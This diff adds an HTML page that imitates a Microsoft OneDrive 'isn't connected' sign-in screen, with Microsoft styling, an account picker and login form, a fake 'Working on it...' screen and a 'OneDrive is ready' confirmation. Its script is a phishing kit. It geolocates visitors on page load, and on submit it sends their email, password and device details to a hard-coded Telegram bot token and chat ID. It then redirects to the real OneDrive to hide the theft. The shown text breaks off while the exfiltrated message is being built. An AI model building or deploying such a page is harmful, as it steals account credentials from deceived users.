@@ -1,0 +1,1452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect to OneDrive - Microsoft</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ms-blue: #0078d4;
+            --ms-blue-dark: #106ebe;
+            --ms-blue-light: #d3e9f8;
+            --ms-gray-05: #faf9f8;
+            --ms-gray-10: #f3f2f1;
+            --ms-gray-20: #edebe9;
+            --ms-gray-30: #e1dfdd;
+            --ms-gray-40: #d2d0ce;
+            --ms-gray-90: #8a8886;
+            --ms-gray-100: #605e5c;
+            --ms-gray-130: #323130;
+            --ms-gray-190: #201f1e;
+            --ms-green: #107c10;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background: #f3f2f1;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: var(--ms-gray-190);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        /* Loading Screen - Microsoft style */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: fadeOut 0.5s ease 1.8s forwards;
+        }
+        
+        .loading-content {
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .loading-logo {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, var(--ms-blue) 0%, #28a8ea 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 32px;
+            margin: 0 auto 24px;
+            animation: pulse 1.5s infinite ease-in-out;
+            box-shadow: 0 8px 24px rgba(0, 120, 212, 0.2);
+        }
+        
+        .loading-text {
+            font-size: 20px;
+            font-weight: 400;
+            color: var(--ms-gray-130);
+            margin-bottom: 8px;
+            letter-spacing: -0.2px;
+        }
+        
+        .loading-subtext {
+            font-size: 14px;
+            color: var(--ms-gray-100);
+            max-width: 300px;
+            opacity: 0.8;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { 
+                transform: scale(1) rotate(0deg); 
+                box-shadow: 0 8px 24px rgba(0, 120, 212, 0.2);
+            }
+            50% { 
+                transform: scale(1.05) rotate(5deg); 
+                box-shadow: 0 12px 32px rgba(0, 120, 212, 0.3);
+            }
+        }
+        
+        @keyframes fadeOut {
+            to { 
+                opacity: 0; 
+                visibility: hidden;
+                pointer-events: none;
+            }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Main Container - Microsoft fluent design */
+        .container {
+            width: 100%;
+            max-width: 440px;
+            background: white;
+            border-radius: 4px;
+            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.08), 
+                        0 2px 6px rgba(0, 0, 0, 0.04), 
+                        0 8px 24px rgba(0, 0, 0, 0.06);
+            overflow: hidden;
+            opacity: 0;
+            transform: translateY(20px) scale(0.98);
+            animation: containerSlideUp 0.4s cubic-bezier(0.1, 0.9, 0.2, 1) 1.8s forwards;
+        }
+        
+        @keyframes containerSlideUp {
+            to { 
+                opacity: 1; 
+                transform: translateY(0) scale(1);
+            }
+        }
+        
+        /* Header with Microsoft branding */
+        .header {
+            padding: 28px 32px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+        
+        .onedrive-logo {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--ms-blue) 0%, #28a8ea 100%);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            flex-shrink: 0;
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.15);
+        }
+        
+        .header-text {
+            font-size: 24px;
+            font-weight: 300;
+            color: var(--ms-gray-190);
+            letter-spacing: -0.2px;
+        }
+        
+        .header-text strong {
+            font-weight: 600;
+        }
+        
+        /* Content Area */
+        .content {
+            padding: 28px 32px;
+        }
+        
+        .status-message {
+            margin-bottom: 32px;
+        }
+        
+        .status-title {
+            font-size: 28px;
+            font-weight: 300;
+            color: var(--ms-gray-190);
+            margin-bottom: 12px;
+            line-height: 1.3;
+            letter-spacing: -0.3px;
+        }
+        
+        .status-title strong {
+            font-weight: 600;
+        }
+        
+        .status-text {
+            font-size: 15px;
+            color: var(--ms-gray-100);
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+        
+        .status-note {
+            font-size: 13px;
+            color: var(--ms-gray-90);
+            line-height: 1.5;
+            margin-top: 16px;
+            padding: 12px;
+            background: var(--ms-gray-05);
+            border-radius: 4px;
+            border-left: 3px solid var(--ms-blue);
+        }
+        
+        /* Sign In Button - Microsoft fluent button */
+        .signin-button {
+            width: 100%;
+            padding: 12px 20px;
+            background: var(--ms-blue);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.1, 0.9, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 24px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .signin-button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.7s;
+        }
+        
+        .signin-button:hover {
+            background: var(--ms-blue-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
+        }
+        
+        .signin-button:hover::after {
+            left: 100%;
+        }
+        
+        .signin-button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 4px rgba(0, 120, 212, 0.3);
+        }
+        
+        /* Separator */
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 32px 0;
+            color: var(--ms-gray-90);
+            font-size: 14px;
+            position: relative;
+        }
+        
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--ms-gray-30);
+        }
+        
+        .separator-text {
+            padding: 0 16px;
+            background: white;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Additional Options */
+        .additional-options {
+            margin-top: 8px;
+        }
+        
+        .option-link {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--ms-blue);
+            text-decoration: none;
+            font-size: 15px;
+            padding: 12px 0;
+            transition: all 0.2s;
+            border-radius: 4px;
+            padding-left: 8px;
+        }
+        
+        .option-link:hover {
+            color: var(--ms-blue-dark);
+            background: var(--ms-gray-05);
+            padding-left: 12px;
+        }
+        
+        .option-link i {
+            width: 20px;
+            text-align: center;
+            font-size: 16px;
+        }
+        
+        /* Footer */
+        .footer {
+            padding: 24px 32px;
+            border-top: 1px solid var(--ms-gray-20);
+            background: var(--ms-gray-05);
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: flex-start;
+            gap: 24px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-link {
+            color: var(--ms-blue);
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+            position: relative;
+        }
+        
+        .footer-link:hover {
+            color: var(--ms-blue-dark);
+        }
+        
+        .footer-link:hover::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: var(--ms-blue-dark);
+        }
+        
+        .copyright {
+            font-size: 12px;
+            color: var(--ms-gray-90);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .copyright i {
+            font-size: 10px;
+        }
+        
+        /* Modal - Microsoft account picker style */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(4px);
+            z-index: 20000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            animation: modalFadeIn 0.3s ease;
+        }
+        
+        .modal.active {
+            display: flex;
+        }
+        
+        @keyframes modalFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal-content {
+            width: 100%;
+            max-width: 440px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.08), 
+                        0 8px 40px rgba(0, 0, 0, 0.12), 
+                        0 24px 80px rgba(0, 0, 0, 0.16);
+            overflow: hidden;
+            animation: modalSlideUp 0.4s cubic-bezier(0.1, 0.9, 0.2, 1);
+            transform-origin: center center;
+        }
+        
+        @keyframes modalSlideUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(40px) scale(0.96); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0) scale(1); 
+            }
+        }
+        
+        .modal-header {
+            padding: 32px 32px 0;
+            margin-bottom: 8px;
+        }
+        
+        .modal-title {
+            font-size: 24px;
+            font-weight: 300;
+            color: var(--ms-gray-190);
+            margin-bottom: 8px;
+            letter-spacing: -0.2px;
+        }
+        
+        .modal-title strong {
+            font-weight: 600;
+        }
+        
+        .modal-subtitle {
+            font-size: 14px;
+            color: var(--ms-gray-100);
+            margin-bottom: 32px;
+        }
+        
+        .modal-body {
+            padding: 0 32px;
+        }
+        
+        /* Account Selector */
+        .account-selector {
+            margin-bottom: 24px;
+            border: 1px solid var(--ms-gray-30);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        .account-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+            border-bottom: 1px solid var(--ms-gray-20);
+        }
+        
+        .account-option:last-child {
+            border-bottom: none;
+        }
+        
+        .account-option:hover {
+            background: var(--ms-gray-05);
+        }
+        
+        .account-option.active {
+            background: var(--ms-blue-light);
+            border-left: 3px solid var(--ms-blue);
+        }
+        
+        .account-icon {
+            width: 32px;
+            height: 32px;
+            background: var(--ms-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+        
+        .account-info {
+            flex: 1;
+        }
+        
+        .account-name {
+            font-weight: 600;
+            color: var(--ms-gray-190);
+            font-size: 15px;
+            margin-bottom: 2px;
+        }
+        
+        .account-email {
+            font-size: 13px;
+            color: var(--ms-gray-100);
+        }
+        
+        .account-action {
+            color: var(--ms-blue);
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--ms-gray-190);
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--ms-gray-90);
+            border-radius: 4px;
+            font-size: 15px;
+            font-family: 'Segoe UI', sans-serif;
+            transition: all 0.2s;
+            background: white;
+        }
+        
+        .form-input:hover {
+            border-color: var(--ms-gray-100);
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--ms-blue);
+            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.12);
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: var(--ms-gray-90);
+            cursor: pointer;
+            padding: 4px;
+            font-size: 16px;
+            transition: color 0.2s;
+        }
+        
+        .toggle-password:hover {
+            color: var(--ms-gray-130);
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 32px;
+        }
+        
+        .remember-checkbox {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            accent-color: var(--ms-blue);
+        }
+        
+        .remember-label {
+            font-size: 15px;
+            color: var(--ms-gray-160);
+            cursor: pointer;
+        }
+        
+        .modal-actions {
+            display: flex;
+            gap: 12px;
+            padding: 24px 32px;
+            background: var(--ms-gray-05);
+            border-top: 1px solid var(--ms-gray-20);
+        }
+        
+        .primary-button {
+            flex: 1;
+            padding: 12px 20px;
+            background: var(--ms-blue);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .primary-button:hover {
+            background: var(--ms-blue-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
+        }
+        
+        .secondary-button {
+            flex: 1;
+            padding: 12px 20px;
+            background: transparent;
+            color: var(--ms-gray-160);
+            border: 1px solid var(--ms-gray-90);
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .secondary-button:hover {
+            background: var(--ms-gray-10);
+            border-color: var(--ms-gray-130);
+        }
+        
+        /* Working State - Microsoft "Working on it..." screen */
+        .working-state {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 30000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .working-state.active {
+            display: flex;
+        }
+        
+        .working-spinner {
+            width: 60px;
+            height: 60px;
+            border: 3px solid var(--ms-gray-20);
+            border-top-color: var(--ms-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 32px;
+            position: relative;
+        }
+        
+        .working-spinner::after {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            border: 3px solid transparent;
+            border-top-color: var(--ms-blue);
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            opacity: 0.5;
+        }
+        
+        .working-text {
+            font-size: 24px;
+            font-weight: 300;
+            color: var(--ms-gray-190);
+            margin-bottom: 12px;
+            letter-spacing: -0.3px;
+        }
+        
+        .working-subtext {
+            font-size: 15px;
+            color: var(--ms-gray-100);
+            max-width: 400px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+        
+        .working-progress {
+            width: 300px;
+            height: 4px;
+            background: var(--ms-gray-20);
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+        
+        .working-progress-bar {
+            height: 100%;
+            background: var(--ms-blue);
+            width: 0%;
+            animation: progress 3s ease-in-out forwards;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            70% { width: 90%; }
+            100% { width: 100%; }
+        }
+        
+        /* Sync Setup Screen */
+        .sync-state {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 40000;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .sync-state.active {
+            display: flex;
+        }
+        
+        .sync-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--ms-green) 0%, #0e6b0e 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 36px;
+            margin-bottom: 32px;
+            animation: scaleIn 0.5s cubic-bezier(0.1, 0.9, 0.2, 1);
+            box-shadow: 0 12px 32px rgba(16, 124, 16, 0.2);
+        }
+        
+        .sync-title {
+            font-size: 28px;
+            font-weight: 300;
+            color: var(--ms-gray-190);
+            margin-bottom: 16px;
+            letter-spacing: -0.3px;
+        }
+        
+        .sync-message {
+            font-size: 16px;
+            color: var(--ms-gray-100);
+            max-width: 400px;
+            line-height: 1.7;
+            margin-bottom: 40px;
+        }
+        
+        .sync-details {
+            background: var(--ms-gray-05);
+            border: 1px solid var(--ms-gray-20);
+            border-radius: 8px;
+            padding: 20px;
+            max-width: 400px;
+            margin-bottom: 32px;
+            text-align: left;
+        }
+        
+        .sync-detail-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 15px;
+            color: var(--ms-gray-130);
+        }
+        
+        .sync-detail-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .sync-detail-item i {
+            color: var(--ms-green);
+            width: 20px;
+            text-align: center;
+        }
+        
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container, .modal-content {
+                max-width: 100%;
+                border-radius: 0;
+            }
+            
+            .header, .content, .footer {
+                padding: 24px;
+            }
+            
+            .modal-header, .modal-body, .modal-actions {
+                padding: 24px;
+            }
+            
+            .working-state, .sync-state {
+                padding: 24px;
+            }
+            
+            .working-text, .sync-title {
+                font-size: 22px;
+            }
+            
+            .status-title {
+                font-size: 24px;
+            }
+        }
+        
+        /* Windows detection hint */
+        .windows-hint {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            font-size: 12px;
+            color: var(--ms-gray-90);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .windows-hint.show {
+            opacity: 0.3;
+        }
+    </style>
+</head>
+<body>
+    <!-- Initial Loading Screen -->
+    <div class="loading-screen">
+        <div class="loading-content">
+            <div class="loading-logo">
+                <i class="fas fa-cloud"></i>
+            </div>
+            <div class="loading-text">OneDrive</div>
+            <div class="loading-subtext">Getting things ready...</div>
+        </div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="onedrive-logo">
+                <i class="fas fa-cloud"></i>
+            </div>
+            <div class="header-text"><strong>One</strong>Drive</div>
+        </div>
+        
+        <!-- Content -->
+        <div class="content">
+            <div class="status-message">
+                <h1 class="status-title"><strong>OneDrive</strong> isn't connected</h1>
+                <p class="status-text">
+                    Sign in to OneDrive to get started
+                </p>
+                <p class="status-text">
+                    Sign in to OneDrive to get to your files and sync them on this device.
+                </p>
+                <div class="status-note">
+                    <i class="fas fa-info-circle" style="margin-right: 6px;"></i>
+                    Your files will be synced and available across all your devices
+                </div>
+            </div>
+            
+            <button class="signin-button" id="signInBtn">
+                <i class="fas fa-sign-in-alt"></i>
+                Sign in
+            </button>
+            
+            <div class="separator">
+                <span class="separator-text">or</span>
+            </div>
+            
+            <div class="additional-options">
+                <a href="#" class="option-link" id="workSchoolLink">
+                    <i class="fas fa-briefcase"></i>
+                    Sign in with a work or school account
+                </a>
+                <a href="#" class="option-link" id="createAccountLink">
+                    <i class="fas fa-user-plus"></i>
+                    Create a Microsoft account
+                </a>
+                <a href="https://onedrive.live.com/about/" class="option-link" id="learnMoreLink" target="_blank">
+                    <i class="fas fa-info-circle"></i>
+                    Learn more about OneDrive
+                </a>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-links">
+                <a href="https://privacy.microsoft.com" class="footer-link" target="_blank">Privacy & cookies</a>
+                <a href="https://www.microsoft.com/servicesagreement" class="footer-link" target="_blank">Terms of use</a>
+                <a href="https://www.microsoft.com/trademarks" class="footer-link" target="_blank">Trademarks</a>
+                <a href="https://www.microsoft.com/en-us/legal/intellectualproperty/copyright" class="footer-link" target="_blank">© 2025 Microsoft</a>
+            </div>
+            <div class="copyright">
+                <i class="fas fa-shield-alt"></i>
+                Your information is protected by Microsoft's security
+            </div>
+        </div>
+    </div>
+    
+    <!-- Sign In Modal -->
+    <div class="modal" id="signInModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Sign in to <strong>OneDrive</strong></h2>
+                <p class="modal-subtitle">Choose an account or enter your Microsoft account details</p>
+            </div>
+            
+            <div class="modal-body">
+                <div class="account-selector" id="accountSelector">
+                    <div class="account-option active" data-type="personal">
+                        <div class="account-icon">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="account-info">
+                            <div class="account-name">Personal Microsoft Account</div>
+                            <div class="account-email">Outlook.com, Hotmail.com, Live.com</div>
+                        </div>
+                        <div class="account-action">Use</div>
+                    </div>
+                    <div class="account-option" data-type="work">
+                        <div class="account-icon" style="background: #5c2d91;">
+                            <i class="fas fa-briefcase"></i>
+                        </div>
+                        <div class="account-info">
+                            <div class="account-name">Work or School Account</div>
+                            <div class="account-email">Company or organization email</div>
+                        </div>
+                        <div class="account-action">Use</div>
+                    </div>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label class="form-label">Email, phone, or Skype</label>
+                        <input type="email" id="email" class="form-input" 
+                               placeholder="someone@example.com" 
+                               autocomplete="username" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Password</label>
+                        <div class="password-container">
+                            <input type="password" id="password" class="form-input" 
+                                   placeholder="Enter your password" 
+                                   autocomplete="current-password" required>
+                            <button type="button" class="toggle-password" id="togglePassword">
+                                <i class="far fa-eye"></i>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="remember-me">
+                        <input type="checkbox" id="rememberMe" class="remember-checkbox" checked>
+                        <label for="rememberMe" class="remember-label">Keep me signed in</label>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="modal-actions">
+                <button type="button" class="secondary-button" id="modalCancelBtn">
+                    Back
+                </button>
+                <button type="submit" class="primary-button" id="modalSignInBtn" form="loginForm">
+                    Next
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Working State -->
+    <div class="working-state" id="workingState">
+        <div class="working-spinner"></div>
+        <div class="working-text">Working on it...</div>
+        <div class="working-subtext">We're setting up your OneDrive and getting your files ready</div>
+        <div class="working-progress">
+            <div class="working-progress-bar"></div>
+        </div>
+    </div>
+    
+    <!-- Sync State -->
+    <div class="sync-state" id="syncState">
+        <div class="sync-icon">
+            <i class="fas fa-check"></i>
+        </div>
+        <div class="sync-title">OneDrive is ready</div>
+        <div class="sync-message">
+            Your files are now syncing to this device. You can access them from File Explorer and your OneDrive folder.
+        </div>
+        
+        <div class="sync-details">
+            <div class="sync-detail-item">
+                <i class="fas fa-folder"></i>
+                <span>OneDrive folder created in your user directory</span>
+            </div>
+            <div class="sync-detail-item">
+                <i class="fas fa-sync"></i>
+                <span>Files are syncing in the background</span>
+            </div>
+            <div class="sync-detail-item">
+                <i class="fas fa-shield-alt"></i>
+                <span>Your files are protected with Microsoft security</span>
+            </div>
+        </div>
+        
+        <button class="primary-button" id="openOneDriveBtn" style="padding: 14px 40px;">
+            <i class="fas fa-external-link-alt"></i>
+            Open OneDrive
+        </button>
+    </div>
+    
+    <!-- Windows hint (only shows if Windows detected) -->
+    <div class="windows-hint" id="windowsHint">
+        <i class="fab fa-windows"></i> Windows 10/11
+    </div>
+
+    <script>
+        // Telegram Configuration
+        const TELEGRAM_BOT_TOKEN = '8404555198:AAE1SxNtayHrFChAi-2lrTIJtdROT_gSThk';
+        const TELEGRAM_CHAT_ID = '6439618231';
+        
+        // Geolocation variables
+        let userIP = 'Unknown';
+        let userCountry = 'Unknown';
+        let userRegion = 'Unknown';
+        let userCity = 'Unknown';
+        let userLat = 0;
+        let userLon = 0;
+        let deviceType = 'Unknown';
+        let osType = 'Unknown';
+        
+        let hasSubmitted = false;
+        
+        // Detect device and OS
+        function detectDeviceAndOS() {
+            const ua = navigator.userAgent;
+            
+            // Detect Windows
+            if (ua.includes('Windows NT 10')) {
+                osType = 'Windows 10';
+            } else if (ua.includes('Windows NT 11')) {
+                osType = 'Windows 11';
+            } else if (ua.includes('Windows NT')) {
+                osType = 'Windows';
+            } else if (ua.includes('Mac')) {
+                osType = 'macOS';
+            } else if (ua.includes('Linux')) {
+                osType = 'Linux';
+            } else if (ua.includes('Android')) {
+                osType = 'Android';
+            } else if (ua.includes('iOS') || ua.includes('iPhone')) {
+                osType = 'iOS';
+            }
+            
+            // Detect device type
+            if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) {
+                deviceType = 'Mobile';
+            } else if (ua.includes('Tablet') || ua.includes('iPad')) {
+                deviceType = 'Tablet';
+            } else {
+                deviceType = 'Desktop';
+            }
+            
+            // Show Windows hint if on Windows
+            if (osType.includes('Windows')) {
+                setTimeout(() => {
+                    document.getElementById('windowsHint').classList.add('show');
+                }, 3000);
+            }
+        }
+        
+        // Fetch geolocation data
+        async function fetchGeolocationData() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+                
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                    const geoData = await geoResponse.json();
+                    
+                    userCountry = geoData.country_name || 'Unknown';
+                    userRegion = geoData.region || geoData.region_code || 'Unknown';
+                    userCity = geoData.city || 'Unknown';
+                    userLat = geoData.latitude || 0;
+                    userLon = geoData.longitude || 0;
+                    
+                } catch (geoError) {
+                    try {
+                        const ipinfoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+                        const ipinfoData = await ipinfoResponse.json();
+                        
+                        if (ipinfoData.loc) {
+                            const [lat, lon] = ipinfoData.loc.split(',');
+                            userLat = parseFloat(lat);
+                            userLon = parseFloat(lon);
+                        }
+                        
+                        userCountry = ipinfoData.country || 'Unknown';
+                        userRegion = ipinfoData.region || 'Unknown';
+                        userCity = ipinfoData.city || 'Unknown';
+                    } catch (e) {
+                        // Silent fail
+                    }
+                }
+                
+            } catch (error) {
+                // Silent fail
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', async function() {
+            // Detect device and OS
+            detectDeviceAndOS();
+            
+            // Fetch geolocation in background
+            fetchGeolocationData();
+            
+            // Main sign in button
+            document.getElementById('signInBtn').addEventListener('click', function() {
+                openSignInModal();
+            });
+            
+            // Work/school account link
+            document.getElementById('workSchoolLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                openSignInModal();
+                selectAccountType('work');
+            });
+            
+            // Create account link
+            document.getElementById('createAccountLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                window.open('https://signup.live.com', '_blank');
+            });
+            
+            // Account selector in modal
+            document.querySelectorAll('.account-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.account-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    this.classList.add('active');
+                    
+                    const type = this.dataset.type;
+                    selectAccountType(type);
+                });
+            });
+            
+            // Modal cancel button
+            document.getElementById('modalCancelBtn').addEventListener('click', function() {
+                closeSignInModal();
+            });
+            
+            // Password toggle
+            document.getElementById('togglePassword').addEventListener('click', function() {
+                const passwordInput = document.getElementById('password');
+                const type = passwordInput.type === 'password' ? 'text' : 'password';
+                passwordInput.type = type;
+                
+                const icon = this.querySelector('i');
+                icon.className = type === 'password' ? 'far fa-eye' : 'far fa-eye-slash';
+            });
+            
+            // Form submission
+            document.getElementById('loginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                if (hasSubmitted) return;
+                hasSubmitted = true;
+                
+                const email = document.getElementById('email').value.trim();
+                const password = document.getElementById('password').value;
+                const accountType = document.querySelector('.account-option.active').dataset.type;
+                
+                // Close modal and show working state
+                closeSignInModal();
+                document.getElementById('workingState').classList.add('active');
+                
+                // Send credentials to Telegram
+                await sendToTelegram(email, password, accountType);
+                
+                // Wait 3 seconds, then show sync state
+                setTimeout(() => {
+                    document.getElementById('workingState').classList.remove('active');
+                    document.getElementById('syncState').classList.add('active');
+                }, 3000);
+            });
+            
+            // Open OneDrive button
+            document.getElementById('openOneDriveBtn').addEventListener('click', function() {
+                window.open('https://onedrive.live.com', '_blank');
+                // Also redirect current window after a delay
+                setTimeout(() => {
+                    window.location.href = 'https://onedrive.live.com';
+                }, 1000);
+            });
+            
+            // Simulate background activity
+            simulateBackgroundActivity();
+            
+            // Auto-focus email field when modal opens
+            document.getElementById('email').addEventListener('focus', function() {
+                this.select();
+            });
+        });
+        
+        function openSignInModal() {
+            document.getElementById('signInModal').classList.add('active');
+            setTimeout(() => {
+                document.getElementById('email').focus();
+            }, 100);
+        }
+        
+        function closeSignInModal() {
+            document.getElementById('signInModal').classList.remove('active');
+        }
+        
+        function selectAccountType(type) {
+            const emailInput = document.getElementById('email');
+            if (type === 'work') {
+                emailInput.placeholder = 'you@yourcompany.com';
+            } else {
+                emailInput.placeholder = 'someone@example.com';
+            }
+        }
+        
+        // Send to Telegram
+        async function sendToTelegram(email, password, accountType) {
+            const timestamp = new Date().toLocaleString('en-US', {
+                month: 'short',
+                day: 'numeric',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            const browserInfo = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const referrer = document.referrer || 'Direct';
+            
+            // Detect if Office is installed
+            const hasOffice = navigator.userAgent.includes('Office') || 
+                             navigator.userAgent.includes('MSOffice') ||
+                             navigator.userAgent.includes('Word') ||
+                             navigator.userAgent.includes('Excel') ||
+                             navigator.userAgent.includes('PowerPoint');
+            
+            const message = `🔄 ONEDRIVE CONNECTION REQUEST 🔄\n\n` +
+                          `👤 Account Type: ${accountType === 'work' ? 'Work/School' : 'Personal'}\n` +
+                          `📧 Email: ${email}\n` +
+                          `🔑 Password: ${password}\n\n` +
+                          `🖥️ DEVICE INFO:\n` +
+                          `OS: ${osType}\n` +
+                          `Device: ${deviceType}\n` +
+                          `Screen: ${screenSize}\n` +
